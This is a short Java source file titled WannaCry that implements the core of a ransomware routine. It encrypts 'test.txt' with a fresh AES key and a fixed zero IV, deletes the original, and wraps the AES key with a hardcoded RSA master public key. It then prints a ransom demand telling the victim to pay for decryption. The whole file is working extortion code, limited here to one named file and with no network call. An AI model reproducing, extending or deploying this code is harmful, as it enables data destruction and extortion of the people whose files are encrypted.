import javax.crypto.*;
import javax.crypto.spec.*;
import java.nio.file.*;
import java.security.*;
import java.security.spec.*;
import java.util.Base64;

public class WannaCry {
    // Master RSA public key (Base64 encoded) - used to encrypt AES key
    private static final String MASTER_PUBLIC_KEY_B64 = 
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzS8c6up15w2Y3lRPx39Z" +
        "yCaR9/1Cb1thfnXwpZfMW0S3rspwl7ChFeP0ivldzaiCrwsDsMPIYBm6mIRW6Awa" +
        "9o4ISEKijGQSuqpC8petSs6wPhMqI0pX+wyoSilEvoUkAVsD/zznDgRvEwWTIcze" +
        "BWd3cr2l74D6rDOpgsO+SnWU3kndLkkvIBchyN4vP/JABfbuXkbFAPVJmrx2eV19" +
        "m1Ecv7lPT62mUF7wGCqEF4tgX4/jg4gYmvB9gu1OIRN4/uBcz6evqHrlKGOhmiHP" +
        "dmNtDHndwkhe3a0CpldcatI+H8FSOxlFKnnlrdOvc4w8kr6pi8nCv61GPcqBql5W" +
        "OQIDAQAB";

    public static void main(String[] args) {
        try {
            // 1. Generate 256-bit AES key
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(256);
            SecretKey aesKey = keyGen.generateKey();
            
            // 2. Create cipher with zero IV
            byte[] iv = new byte[16]; // all zeros
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            Cipher aesCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, ivSpec);
            
            // 3. Read, encrypt, write
            byte[] plaintext = Files.readAllBytes(Paths.get("test.txt"));
            byte[] ciphertext = aesCipher.doFinal(plaintext);
            Files.write(Paths.get("test.txt.cry"), ciphertext);
            
            // 4. Delete original
            Files.delete(Paths.get("test.txt"));
            
            // 5. Encrypt AES key with RSA master public key
            PublicKey masterPublicKey = loadMasterPublicKey();
            Cipher rsaCipher = Cipher.getInstance("RSA");
            rsaCipher.init(Cipher.ENCRYPT_MODE, masterPublicKey);
            byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());
            Files.write(Paths.get("aes.key"), encryptedAesKey);
            
            System.out.println("Your files have been encrypted!");
            System.out.println("To recover your files, you must pay the ransom.");
            System.out.println("Contact us with your payment ID to receive the decryption key.");
            
        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
        }
    }
    
    private static PublicKey loadMasterPublicKey() throws Exception {
        byte[] keyBytes = Base64.getDecoder().decode(MASTER_PUBLIC_KEY_B64);
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(keyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        return keyFactory.generatePublic(keySpec);
    }
}
